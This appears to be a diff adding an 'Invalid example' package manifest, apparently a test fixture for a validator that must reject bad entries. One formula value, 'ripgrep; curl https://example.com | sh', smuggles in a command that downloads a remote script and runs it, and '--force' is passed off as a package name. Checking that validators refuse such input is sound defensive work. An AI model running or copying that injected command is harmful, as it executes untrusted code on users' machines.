@@ -1,0 +1,10 @@
+{
+  "schemaVersion": 1,
+  "name": "Invalid example",
+  "packages": {
+    "formulae": [
+      "--force",
+      "ripgrep; curl https://example.com | sh"
+    ]
+  }
+}
